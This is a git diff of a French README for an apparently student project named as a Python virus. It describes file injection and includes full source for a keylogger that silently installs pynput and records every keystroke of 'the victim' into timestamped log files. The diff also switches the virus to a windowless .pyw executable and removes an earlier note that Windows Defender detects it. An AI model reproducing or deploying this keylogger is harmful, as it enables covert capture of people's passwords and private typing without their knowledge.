@@ -13,6 +13,8 @@
 
 >Un virus est un programme informatique malveillant dont l'objectif est de perturber le fonctionnement normal d'un système informatique à l'insu de son propriétaire
 
+**Veuillez vous rendre sur https://github.com/IPSSI-Jean/Virus-Python-IPSSI pour avoir une vue globale sur le projet et sur l'affichage du README**
+
 # Prérequis
 - Visual studio code
 
@@ -31,7 +33,7 @@ Il est recommandé d'exécuter ce programme dans un environnement virtuel, il es
 
 Le projet repose sur 1 fichiers Python, 1 fichier de test en .py : 
 
-- ```virus.py``` --> Qui contient le code du virus
+- ```virus.pyw``` --> Qui contient le code du virus (exécutable)
 
 - ```test.py``` --> Qui est vide, il sera remplis par le code injécté du virus
 
@@ -193,29 +195,53 @@ Pour cette dernière partie du code, le virus va ouvrir se rendre dans les dossi
 
 ## Keylogger
 
-Cette partie du code va ouvrir un keylogger qui enregistrera **TOUTES** les frappes de la victime, ce dernier est très simplifié pour ne pas faire un projet dédié keylogger au sein du fichier, il est cependant tout à fait possible ( et simple ) d'implémenter un keylogger non détécté
-
-
-Il est donc détécté par Windows defender, afin de le tester il suffit de cliquer sur " autoriser sur l'appareil " dans Windows Defender puis " Intervenir "
+Cette partie du code va ouvrir un keylogger qui enregistrera **TOUTES** les frappes de la victime
 
 ```python
-#----------------KEYLOGGER---------------
-
-# Un simple keylogger qui est détécté par Windows ( afin d'éviter un immense code dédié )
-# Il est tout à fait possible ( et simple ) d'implémenter un keylogger non détécté
 
 #Installation du module pynput
 os.system('python -m pip install pynput')
 
+#----------------KEYLOGGER---------------
+
 from pynput.keyboard import Key, Listener
 import logging
- 
- #Enregistrement des frappes de l'utilisateurs dans un fichier local keylog.txt
-logging.basicConfig(filename=("keylog.txt"), level=logging.DEBUG, format=" %(asctime)s - %(message)s")
- 
-def on_press(key):
-    logging.info(str(key))
- 
-with Listener(on_press=on_press) as listener :
-    listener.join()
+import os
+from datetime import datetime
+
+class Keylogger:
+        
+    #Fonction de création du répertoire log
+    def create_log_directory(self):
+        sub_dir = "log"
+        cwd = os.getcwd()
+        self.log_dir = os.path.join(cwd,sub_dir)
+        if not os.path.exists(sub_dir):
+            os.mkdir(sub_dir)
+
+    @staticmethod
+    def on_press(key):
+        try:
+            logging.info(str(key))
+        except Exception as e:
+            logging.info(e)       
+    def write_log_file(self):
+        # Formattage de la date / heure
+        time = str(datetime.now())[:-7].replace(" ", "-").replace(":", "")
+        # Logging dans le fichier
+        logging.basicConfig(
+                filename=(os.path.join(self.log_dir, time) + "-log.txt"),
+                level=logging.DEBUG, 
+                format= '[%(asctime)s]: %(message)s',
+            )
+        
+        with Listener(on_press=self.on_press) as listener:
+            listener.join()
+    
+# Call des fonctions
+if __name__ == "__main__":
+    keyloggerlog = Keylogger()
+    keyloggerlog.create_log_directory()
+    keyloggerlog.write_log_file()
+
 ```
